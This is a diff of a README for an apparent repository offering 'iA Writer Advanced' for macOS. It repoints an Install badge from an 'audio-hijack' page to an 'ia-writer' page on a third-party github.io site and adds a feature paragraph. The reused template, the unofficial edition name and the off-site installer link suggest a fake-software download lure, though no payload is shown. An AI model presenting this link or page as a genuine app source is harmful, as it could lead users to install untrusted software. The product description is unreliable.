@@ -13,11 +13,8 @@
   <img src="https://img.shields.io/badge/Apple_Silicon-Ready-orange?style=flat-square"/>
 </p>
 
----
-| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://marat-klubnika-apps.github.io/.github/audio-hijack) | **Native minimalist markdown writing built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://marat-klubnika-apps.github.io/.github/ia-writer) | **Native minimalist markdown writing built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
 |---|---|
-
----
 
 <p align="center">
   <img src="https://decoding.io/wp-content/uploads/2023/12/Screenshot-2023-12-03-at-08.41.46-1.png" alt="iA Writer — minimalist markdown writing for macOS" width="780"/>
@@ -32,6 +29,8 @@ iA Writer Advanced is a minimalist markdown writing application built around a s
 Focus Mode dims everything but the current sentence or paragraph, creating a writing environment that physically narrows attention to whatever is being written right now.
 
 Syntax highlighting distinguishes nouns, verbs, adjectives, and other parts of speech directly in the editor, an unusual feature that helps writers spot overused words and weak sentence construction as they write.
+
+A library view organizes drafts into folders without leaving the writing application, providing just enough structure for a growing body of work without distracting from the page currently being written.
 
 For writers who believe that the writing tool itself should disappear during the act of writing, iA Writer Advanced is the markdown editor built around that disappearing-tool philosophy.
 
